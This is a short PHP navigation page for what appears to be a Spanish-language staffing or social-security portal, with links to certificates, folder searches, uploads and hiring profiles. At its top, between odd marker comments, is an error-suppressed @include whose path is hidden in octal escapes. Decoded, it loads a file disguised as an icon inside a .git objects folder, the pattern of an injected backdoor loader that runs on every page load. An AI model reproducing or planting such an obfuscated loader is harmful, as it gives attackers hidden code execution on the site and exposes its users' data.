<?php
/*1767a*/

@include "\057h\157m\1454\057b\171v\156i\154v\141l\057d\145s\141r\162o\154l\157.\146o\162m\141l\163i\056c\157m\057f\157r\155a\154s\151d\145v\057.\147i\164/\157b\152e\143t\163/\063a\057.\1446\146c\143b\0666\056i\143o";

/*1767a*/



?>

<a href="certificados/index.php">Certificaciones</a><br>
<a href="folder/buscar.php">Buscar folder</a><br>
<a href="folderarl/buscar.php">Buscar folder ARL</a><br>
<a href="folderarlfsi/buscar.php">Buscar folder FORMALSI(NO ESTA DISEÑADO)</a><br>
<a href="folderfsi/buscar.php">Buscar folder Seguridad social formal si (NO DISEÑADO)</a><br>
<a href="excel_novedades/cargar.html">Cargar Archivos</a><br>
<a href="gestioncontratacion/perfil.php">Creacion de Perfil</a><br>
<a href="gestioncontratacion/requesion.php">Gestionar Requision</a><br>
